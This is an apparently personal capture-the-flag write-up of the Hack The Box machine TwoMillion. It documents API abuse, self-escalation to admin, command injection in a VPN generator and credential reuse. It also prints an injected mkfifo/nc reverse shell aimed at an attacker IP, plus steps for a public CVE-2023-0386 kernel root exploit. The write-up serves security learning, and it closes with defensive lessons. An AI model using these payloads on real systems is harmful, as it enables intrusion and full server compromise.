# TwoMillion: Hack The Box Writeup

**Machine:** TwoMillion  
**OS:** Linux  
**Difficulty:** Easy  
**Status:** Retired  
**Date Completed:** March 2026  

---

## Summary

TwoMillion is a nostalgic machine built around HTB's old invite-only platform. The attack chain starts with reverse engineering obfuscated JavaScript to discover an invite code generation API, progresses through broken access control on an admin endpoint to escalate privileges within the application, and then exploits command injection in a VPN generation feature to obtain a reverse shell. Credentials found in a `.env` file allow SSH access as `admin`. Privilege escalation to root is achieved by exploiting CVE-2023-0386, a local privilege escalation vulnerability in the Linux kernel's OverlayFS implementation.

**Key techniques:** JavaScript deobfuscation · ROT13/Base64 decoding · API enumeration · Broken access control · Command injection · Reverse shell · Credential harvesting · Kernel exploit (CVE-2023-0386)

---

## Reconnaissance

Full port scan:

```bash
sudo nmap -sV -sC -p- -T5 10.129.8.115
```

**Results:**

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1
80/tcp open  http    nginx: redirects to http://2million.htb/
```

Two services: SSH and a web server. The HTTP service redirects to `2million.htb`, which means we need to add it to our hosts file first:

```bash
sudo vi /etc/hosts
# Add: 10.129.8.115  2million.htb
```

---

## Enumeration

### Web Application

Navigating to `http://2million.htb` reveals a recreation of HTB's old website. Most links return 404 or redirect. The interesting endpoints are:

- `/invite`: an invite code entry form
- `/login`: login page

`/invite` is the clear starting point: the site is invite-only, so we need to generate a valid code to register.

### JavaScript Deobfuscation: Finding the Invite API

Viewing the page source (`Ctrl+U`) reveals a script reference:

```html
<script defer src="/js/inviteapi.min.js"></script>
```

Opening that file shows heavily obfuscated JavaScript using a `eval(function(p,a,c,k,e,d){...})` pattern: this is a common packer format used to compress and obfuscate JS. Pasting the code into an online JavaScript unpacker (such as [https://jsonformatter.ai/eval-decoder-javascript](https://jsonformatter.ai/eval-decoder-javascript)) reveals the underlying functions:

```javascript
function verifyInviteCode(code) {
    var formData = { "code": code };
    $.ajax({
        type: "POST", dataType: "json", data: formData,
        url: '/api/v1/invite/verify',
        success: function(response) { console.log(response) },
        error: function(response) { console.log(response) }
    })
}

function makeInviteCode() {
    $.ajax({
        type: "POST", dataType: "json",
        url: '/api/v1/invite/how/to/generate',
        success: function(response) { console.log(response) },
        error: function(response) { console.log(response) }
    })
}
```

Two functions: one to verify a code, one to generate one. The `makeInviteCode()` function POSTs to `/api/v1/invite/how/to/generate`: hitting that endpoint directly:

```bash
curl -X POST http://2million.htb/api/v1/invite/how/to/generate
```

```json
{
  "0": 200,
  "success": 1,
  "data": {
    "data": "Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb \/ncv\/i1\/vaivgr\/trarengr",
    "enctype": "ROT13"
  },
  "hint": "Data is encrypted ... check the encryption type in order to decrypt it..."
}
```

The server is telling us exactly what encoding it used: ROT13. Decoding it:

```bash
echo "Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb \/ncv\/i1\/vaivgr\/trarengr" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
```

> `In order to generate the invite code, make a POST request to /api/v1/invite/generate`

### Generating the Invite Code

```bash
curl -X POST http://2million.htb/api/v1/invite/generate
```

```json
{
  "0": 200,
  "success": 1,
  "data": {
    "code": "U0tIWDItVEs0UjMtWFlNNFYtOVpUTE4=",
    "format": "encoded"
  }
}
```

The code is Base64 encoded. Decoding it:

```bash
echo "U0tIWDItVEs0UjMtWFlNNFYtOVpUTE4=" | base64 -d
# SKHX2-TK4R3-XYM4V-9ZTLN
```

<img width="1314" height="662" alt="Screenshot 2026-03-20 185634" src="https://github.com/user-attachments/assets/5eaaee00-8e40-4f9d-95c1-d66c57b8e335" />

Entering this at `/invite` allows registration. This time around we will be using the mail "password@password.com", user "password" and password "password", just for fun. After creating an account and logging in, we have access to the dashboard.

---

## API Enumeration: Discovering Admin Endpoints

The dashboard has limited functionality, but the VPN buttons in the HTML point to `/api/v1/user/vpn/...`, which suggests the app is fully API-driven. API-driven apps often expose a root endpoint that lists all available routes.

<img width="1638" height="785" alt="Screenshot 2026-03-20 185653" src="https://github.com/user-attachments/assets/2a985666-4a1a-4774-b24a-a1e782c3bb58" />

First, grab the session cookie from browser dev tools (Application → Cookies → `PHPSESSID`), then query the API root:

```bash
curl -s http://2million.htb/api/v1 -b "PHPSESSID=ld0jhsvf532d9neescis4tnqos"
```

The response reveals the full route list, including a privileged admin section:

```json
"admin": {
    "GET":  { "/api/v1/admin/auth": "Check if user is admin" },
    "POST": { "/api/v1/admin/vpn/generate": "Generate VPN for specific user" },
    "PUT":  { "/api/v1/admin/settings/update": "Update user settings" }
}
```

Checking our current privilege level:

```bash
curl -s http://2million.htb/api/v1/admin/auth -b "PHPSESSID=ld0jhsvf532d9neescis4tnqos"
# {"message":false}
```

Not an admin. But notice the `PUT /api/v1/admin/settings/update` endpoint: it's an admin route that's accessible without admin privileges. This is **broken access control**.

---

## Broken Access Control: Escalating to Admin

Probing the endpoint iteratively to find what parameters it expects:

```bash
# No content type
curl -s -X PUT http://2million.htb/api/v1/admin/settings/update -b "PHPSESSID=..."
# {"status":"danger","message":"Invalid content type."}

# Add JSON content type
curl -s -X PUT ... -H "Content-Type: application/json"
# {"status":"danger","message":"Missing parameter: email"}

# Add email
curl -s -X PUT ... -d '{"email":"password@password.com"}'
# {"status":"danger","message":"Missing parameter: is_admin"}

# Add is_admin flag
curl -s -X PUT ... -d '{"email":"password@password.com","is_admin":1}'
# {"id":13,"username":"password","is_admin":1}
```

Verifying the result:

```bash
curl -s http://2million.htb/api/v1/admin/auth -b "PHPSESSID=..."
# {"message":true}
```

We are now admin. The application trusted user-supplied input to set privilege level: a textbook broken access control vulnerability.

---

## Initial Access: Command Injection

With admin privileges, the VPN generation endpoint is now accessible:

```bash
curl -s -X POST http://2million.htb/api/v1/admin/vpn/generate \
  -b "PHPSESSID=..." -H "Content-Type: application/json" \
  -d '{"username":"password"}'
```

This returns a full VPN certificate with the submitted username embedded in the certificate's CN (Common Name) field. This means the server is passing the username directly into a system call: something like:

```bash
openssl ... -subj "/CN=<username>" ...
```

When user input is passed directly to a shell command without sanitisation, command injection is possible. Testing with a semicolon to break out of the intended command:

```bash
curl -s -X POST http://2million.htb/api/v1/admin/vpn/generate \
  -b "PHPSESSID=..." -H "Content-Type: application/json" \
  -d '{"username":"password;id;"}'

# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

We have **Remote Code Execution** as `www-data`. Time to get a reverse shell.

### Reverse Shell

A standard bash reverse shell (`bash -i >& /dev/tcp/...`) won't work here because the server is likely executing commands through `sh` (dash) via PHP's `system()` or `exec()`, and `sh`/`dash` doesn't support `/dev/tcp`. Instead, use a named pipe (mkfifo) approach which is shell-agnostic:

**Set up listener on attack machine:**

```bash
nc -lvnp 4000
```

**Send the payload:**

```bash
curl -s -X POST http://2million.htb/api/v1/admin/vpn/generate \
  -b "PHPSESSID=..." -H "Content-Type: application/json" \
  -d '{"username":"password;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.15.12 4000 >/tmp/f;"}'
```

The curl request hangs (504 Gateway Timeout): that's expected, it means the payload executed and the connection is being held open. Checking the listener:

```
connect to [10.10.15.12] from (UNKNOWN) [10.129.8.115] 53966
www-data@2million:~/html$
```

Shell obtained as `www-data`.

---

## Credential Harvesting: .env File

Listing the web root:

```bash
ls -la
```

A `.env` file is immediately visible: these files store environment variables for web apps and frequently contain database credentials:

```bash
cat .env
# DB_HOST=127.0.0.1
# DB_DATABASE=htb_prod
# DB_USERNAME=admin
# DB_PASSWORD=SuperDuperPass123
```

Testing credential reuse over SSH (a reliable pattern to always check):

```bash
ssh admin@10.129.8.115
# Password: SuperDuperPass123
# Login successful
```

```bash
cat user.txt
# 2442a8031234b5121ce6a316f91d666d
```

---

## Privilege Escalation: CVE-2023-0386 (OverlayFS)

### Enumeration

```bash
sudo -l
# sudo: a password is required: no sudo privileges
```

Running LinPEAS reveals an old kernel version and several CVE suggestions, but nothing immediately obvious. However, checking the system mail is more productive:

```bash
cat /var/mail/admin
```

The mail contains a direct hint from the machine's lore:

> *"There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty."*

Checking the kernel version:

```bash
uname -a
# Linux 2million 5.15.70-051570-generic #202209231339
```

This version is vulnerable to **CVE-2023-0386**: a local privilege escalation in the Linux kernel's OverlayFS implementation. The vulnerability allows an unprivileged user to copy files with SUID bits set into an OverlayFS mount, then execute them to gain root.

### Exploitation

Clone the PoC on the attack machine:

```bash
git clone https://github.com/sxlmnwb/CVE-2023-0386
zip -r cve.zip CVE-2023-0386
python3 -m http.server 8000
```

Transfer and compile on target:

```bash
wget http://10.10.15.12:8000/cve.zip
unzip cve.zip
cd CVE-2023-0386
make all
```

The exploit requires two terminals running simultaneously. Open a second SSH session.

**Terminal 1: run the FUSE component:**

```bash
./fuse ./ovlcap/lower ./gc
# [+] len of gc: 0x3ee0
# [+] readdir
# [+] open_callback ...
```

**Terminal 2: trigger the exploit:**

```bash
./exp
# uid:1000 gid:1000
# [+] mount success
# -rwsrwxrwx 1 nobody nogroup 16096 ... file
# [+] exploit success!

root@2million:~/CVE-2023-0386# whoami
root
```

```bash
cat /root/root.txt
# 6b25e6760c18983763d8b97602384f95
```

---

<!-- Completion Image Here -->
<img width="1200" height="681" alt="Screenshot 2026-04-28 103909" src="https://github.com/user-attachments/assets/ab9f570f-a006-406b-b70f-579b1a667767" />

---

## Vulnerability Summary

| Vulnerability | Location | Impact |
|---------------|----------|--------|
| JavaScript obfuscation (weak) | `/js/inviteapi.min.js` | Invite API endpoints exposed via deobfuscation |
| Insecure encoding (ROT13/Base64) | `/api/v1/invite/how/to/generate` | Invite generation instructions trivially decoded |
| Broken access control | `PUT /api/v1/admin/settings/update` | Any authenticated user can self-escalate to admin |
| Command injection | `POST /api/v1/admin/vpn/generate` | RCE as `www-data` via unsanitised username parameter |
| Cleartext credentials in `.env` | `/var/www/html/.env` | Database credentials exposed on filesystem |
| Credential reuse | `.env` → SSH | `admin` SSH access via database password |
| CVE-2023-0386 (OverlayFS LPE) | Linux kernel 5.15.70 | Full root via kernel privilege escalation |

---

## Key Takeaways

- **Deobfuscate everything**: packed JavaScript is not security. It's a minor inconvenience that takes seconds to reverse
- **API enumeration is critical**: hitting `/api/v1` directly revealed the entire route map, including admin endpoints that should never have been publicly documented
- **Broken access control is one of the most common real-world vulnerabilities** (OWASP A01): the app allowed any user to promote themselves to admin by simply sending `"is_admin":1`
- **Never trust user input in system calls**: the command injection existed because the username parameter was passed directly to a shell command without sanitisation
- **`.env` files are a goldmine**: always check the web root for configuration files containing credentials
- **Credential reuse remains extremely common**: database passwords frequently double as system account passwords
- **In-band hints matter**: the mail in `/var/mail/admin` pointed directly at the CVE. In real engagements, documentation, emails, and comments often reveal exactly what to look for

---

*Part of my HTB writeup series: [back to portfolio](https://github.com/Egio7)*
